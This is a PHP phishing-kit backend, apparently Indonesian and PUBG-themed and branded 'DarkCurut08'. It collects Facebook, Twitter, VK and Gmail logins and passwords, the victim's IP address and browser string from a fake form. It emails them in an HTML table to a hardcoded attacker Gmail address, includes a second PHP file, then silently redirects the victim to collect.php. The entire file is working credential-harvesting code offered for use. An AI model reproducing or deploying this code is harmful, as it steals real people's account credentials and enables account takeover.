<?php
$emailkamu = "darkcurut08@gmail.com";
$evk = $_POST['evk'];
$pvk = $_POST['pvk'];
$efb = $_POST['efb'];
$pfb = $_POST['pfb'];
$etw = $_POST['etw'];
$ptw = $_POST['ptw'];
$gmail = $_POST['gmail'];
$gpass = $_POST['gpass'];
$nope = $_POST['nope'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$link = $_SERVER['SERVER_NAME'];
$browser = $_SERVER['HTTP_USER_AGENT'];


$subject = " |[ Setor Akun PUBG ]| '.$ip.'";
$message = '
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=6><b>DarkCurut08</b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
<b>|[ Setor Akun PUBG ]|</b>
<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:0px;background:red">
				EMAIL FB
			</th>
			<th style="color:white;padding:3px;background:red">
				PASS FB
			</th>	
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$efb.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$pfb.'</b>				
			</td>
		</tr>
	</tbody>
</div>

<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:0px;background:red">
				EMAIL TWITTER
			</th>
			<th style="color:white;padding:3px;background:red">
				PASS TWITTER
			</th>	
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$etw.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$ptw.'</b>				
			</td>
		</tr>
	</tbody>
</div>

<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:0px;background:red">
				EMAIL VK
			</th>
			<th style="color:white;padding:3px;background:red">
				PASS VK
			</th> 
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$evk.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$pvk.'</b>				
			</td>
		</tr>
	</tbody>
</div>

<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:0px;background:red">
	  		 	      GMAIL
			</th>
			<th style="color:white;padding:3px;background:red">
				PASSWORD
			</th>	
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$gmail.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$gpass.'</b>				
			</td>
		</tr>
	</tbody>
</div>

<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=3 color=white><b> 2019 - DarkCurut08</b></font></div>
</center>

';

include 'img/firearms/index.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: DarkCurut08@hacker.id' . "\r\n";
$datamail = mail($emailkamu, $subject, $message, $headersx);
?>


<html>
<head>
<meta http-equiv="REFRESH" content="0;url=collect.php">
</head>
<body>
</body>
</html>
